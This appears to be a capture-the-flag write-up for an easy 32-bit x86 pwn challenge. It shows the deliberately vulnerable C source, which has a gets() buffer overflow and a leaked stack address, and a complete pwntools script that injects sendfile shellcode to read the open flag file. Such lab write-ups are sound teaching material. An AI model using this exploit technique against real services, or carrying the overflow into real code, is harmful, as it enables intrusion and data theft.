+++
date = '2026-03-29'
title = 'Spelunk'
tags = ['pwn', 'easy']
+++

Category: Pwn

Difficulty: Easy (30 points)

Author: Théo Davreux

## Description

Hello adventurer! I've found a secret cave, but I've lost my light. I've opened the map (flag file) but I can't read it anymore. Can you help me?

## Solution

We get this source file, which pretty much already tells us how the exploit should be structured.

```c
/*
 * Spelunk: A baby's first pwn challenge.
 *
 * Instructions:
 * - Compiled as 32-bit x86.
 * - No stack protection, no PIE, executable stack.
 * - The flag is opened at the start of the program and its FD is kept open.
 * - The goal is to inject shellcode that reads from the flag's FD and writes to
 * stdout.
 */

void vuln(int client_fd) {
  char buf[128];

  // Redirect stdin and stdout to the client socket
  dup2(client_fd, 0);
  dup2(client_fd, 1);

  // Leak the buffer address to make it easy to jump to shellcode
  printf(
      "Hello adventurer! I've found a secret cave, but I've lost my light.\n");
  printf("I can see my map at: %p\n", (void *)buf);
  printf("Can you help me? What did you find? ");
  fflush(stdout);

  // The vulnerability: gets() reads until newline, allowing buffer overflow.
  gets(buf);

  printf("You found: %s\n", buf);
  printf("That doesn't seem to help... goodbye!\n");
  fflush(stdout);
}

int main() {
  // 1. Open flag file. This will likely be FD 3.
  // The entrypoint script will write this file and then delete it after 1
  // second.
  int flag_fd = open("/tmp/flag.txt", O_RDONLY);
  if (flag_fd == -1) {
    perror("Error opening flag");
    exit(1);
  }

  // 2. Setup socket server on port 1337
  ...
}
```

Since the stack is executable, we will just write some shellcode to the stack, and then jump to this shell code
by using the buffer overflow to overwrite the return address on the stack. This is possible since the code
leaks the address of the buffer, which is the address we will jump to.

We will use the `sendfile` syscall to send the flag file (stream 3), to stdout (stream 1).

### Solution Script

```py
from pwn import *

p = process('./spelunk')
context.arch = 'x86'

addr = int(p.recvline_contains(b'I can see my map at: ').decode().removeprefix('I can see my map at: 0x'), 16)

code = """
    mov eax, 187    /* Sendfile syscall */
    mov ebx, 1      /* Out: 1, stdout */
    mov ecx, 3      /* In: 3, flag */
    xor edx, edx    /* Offset: 0 */
    mov esi, 0x100  /* Length */
    int 0x80        /* Execute syscall */
"""

payload = flat({
    0: asm(code),
    140: p32(addr)
})

p.sendline(payload)
p.interactive()
```